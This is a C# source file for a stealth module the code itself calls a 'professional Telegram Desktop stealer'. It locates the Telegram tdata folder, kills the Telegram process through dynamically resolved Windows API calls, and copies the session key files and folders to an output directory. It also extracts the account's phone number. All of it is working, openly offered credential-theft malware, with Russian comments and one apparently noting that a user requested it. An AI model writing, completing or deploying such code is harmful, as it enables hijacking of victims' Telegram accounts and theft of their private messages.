using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace StealthModule
{
    /// <summary>
    /// Профессиональный стиллер Telegram Desktop (Stealth + NativeApi)
    /// </summary>
    public class TelegrabManager
    {
        private const uint PROCESS_TERMINATE = 0x0001;

        #region NativeApi (Standardized)
        private static class NativeApi
        {
            private static Dictionary<string, Delegate> _delegateCache = new Dictionary<string, Delegate>();
            private static Dictionary<string, IntPtr> _moduleCache = new Dictionary<string, IntPtr>();

            private static IntPtr GetModule(string name)
            {
                if (_moduleCache.ContainsKey(name)) return _moduleCache[name];
                IntPtr hMod = GetModuleHandleW(name);
                if (hMod == IntPtr.Zero) hMod = LoadLibraryW(name);
                _moduleCache[name] = hMod;
                return hMod;
            }

            private static T GetPInvoke<T>(string module, string function) where T : class
            {
                string key = module + "!" + function;
                if (_delegateCache.ContainsKey(key)) return _delegateCache[key] as T;
                IntPtr hModule = GetModule(module);
                IntPtr pFunc = GetProcAddress(hModule, function);
                if (pFunc == IntPtr.Zero) return null;
                var del = Marshal.GetDelegateForFunctionPointer(pFunc, typeof(T)) as T;
                _delegateCache[key] = del;
                return del;
            }

            [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
            private static extern IntPtr GetModuleHandleW(string lpModuleName);
            [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
            private static extern IntPtr LoadLibraryW(string lpFileName);
            [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

            public static T GetK32<T>(string func) where T : class { return GetPInvoke<T>("kernel32.dll", func); }
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr OpenProcessDelegate(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        private static OpenProcessDelegate OpenProcess { get { return NativeApi.GetK32<OpenProcessDelegate>("OpenProcess"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool TerminateProcessDelegate(IntPtr hProcess, uint uExitCode);
        private static TerminateProcessDelegate TerminateProcess { get { return NativeApi.GetK32<TerminateProcessDelegate>("TerminateProcess"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool CloseHandleDelegate(IntPtr hObject);
        private static CloseHandleDelegate CloseHandle { get { return NativeApi.GetK32<CloseHandleDelegate>("CloseHandle"); } }
        #endregion

        public static string GetTelegramPath()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

                // Имена папок "в тексте", как просил юзер
                string folderName = "Telegram Desktop";
                string tdataName = "tdata";

                string[] searchPaths = {
                    Path.Combine(appData, folderName, tdataName),
                    Path.Combine(localApp, folderName, tdataName)
                };

                foreach (string path in searchPaths)
                {
                    if (Directory.Exists(path) && File.Exists(Path.Combine(path, "key_datas")))
                        return path;
                }

                Process[] tgProcs = Process.GetProcessesByName("Telegram");
                if (tgProcs.Length > 0)
                {
                    try
                    {
                        string exePath = tgProcs[0].MainModule.FileName;
                        string tdata = Path.Combine(Path.GetDirectoryName(exePath), tdataName);
                        if (Directory.Exists(tdata)) return tdata;
                    }
                    catch { }
                }
            }
            catch { }
            return null;
        }

        private static void KillTelegram()
        {
            try
            {
                foreach (Process p in Process.GetProcessesByName("Telegram"))
                {
                    IntPtr hProc = OpenProcess(PROCESS_TERMINATE, false, (uint)p.Id);
                    if (hProc != IntPtr.Zero)
                    {
                        TerminateProcess(hProc, 0);
                        CloseHandle(hProc);
                    }
                }
            }
            catch { }
        }

        public static bool Run(string outputDir)
        {
            try
            {
                string tdataPath = GetTelegramPath();
                if (string.IsNullOrEmpty(tdataPath)) return false;

                KillTelegram();
                Thread.Sleep(500);

                string dest = Path.Combine(outputDir, "Messengers", "Telegram");
                Directory.CreateDirectory(dest);

                CopyTdata(tdataPath, dest);
                SaveSessionInfo(dest, tdataPath);
                return true;
            }
            catch { return false; }
        }

        private static void SaveSessionInfo(string dest, string tdataPath)
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                sb.AppendLine("=== Telegram Session Info ===");
                sb.AppendLine(string.Format("Path: {0}", tdataPath));
                sb.AppendLine(string.Format("Date: {0}", DateTime.Now));
                try
                {
                    string keyDatas = Path.Combine(tdataPath, "key_datas");
                    if (File.Exists(keyDatas))
                    {
                        string content = File.ReadAllText(keyDatas);
                        Match m = Regex.Match(content, @"\+\d{10,15}");
                        if (m.Success) sb.AppendLine(string.Format("Phone: {0}", m.Value));
                    }
                }
                catch { }
                File.WriteAllText(Path.Combine(dest, "info.txt"), sb.ToString());
            }
            catch { }
        }

        private static void CopyTdata(string src, string dest)
        {
            try
            {
                if (!Directory.Exists(dest)) Directory.CreateDirectory(dest);

                // Черный список папок (мусор)
                List<string> blacklist = new List<string> { 
                    "userphotos", "emoji", "thumbnails", "dumps", "logs", "cache", "temp" 
                };

                foreach (string file in Directory.GetFiles(src))
                {
                    string name = Path.GetFileName(file);
                    if (name.EndsWith(".log") || name.StartsWith("temp") || name.Contains("cache")) continue;

                    // Собираем все файлы сессии (key_datas, map и файлы с 16-символьными именами)
                    if (name == "key_datas" || name == "map" || name.Length >= 15)
                    {
                        File.Copy(file, Path.Combine(dest, name), true);
                    }
                }

                foreach (string dir in Directory.GetDirectories(src))
                {
                    string name = Path.GetFileName(dir);
                    if (blacklist.Contains(name.ToLower())) continue;

                    // Сохраняем папки сессий (обычно 16 симв. hex)
                    if (name.Length >= 15 || name.StartsWith("D877"))
                    {
                        CopyFolderRecursive(dir, Path.Combine(dest, name));
                    }
                }
            }
            catch { }
        }

        private static void CopyFolderRecursive(string src, string dest)
        {
            try
            {
                Directory.CreateDirectory(dest);
                foreach (string file in Directory.GetFiles(src))
                {
                    string name = Path.GetFileName(file);
                    if (name.EndsWith(".log") || name.StartsWith("temp")) continue;
                    File.Copy(file, Path.Combine(dest, name), true);
                }
                
                foreach (string dir in Directory.GetDirectories(src))
                {
                    string name = Path.GetFileName(dir);
                    if (name.ToLower() == "cache" || name.ToLower() == "dumps") continue;
                    CopyFolderRecursive(dir, Path.Combine(dest, name));
                }
            }
            catch { }
        }
    }
}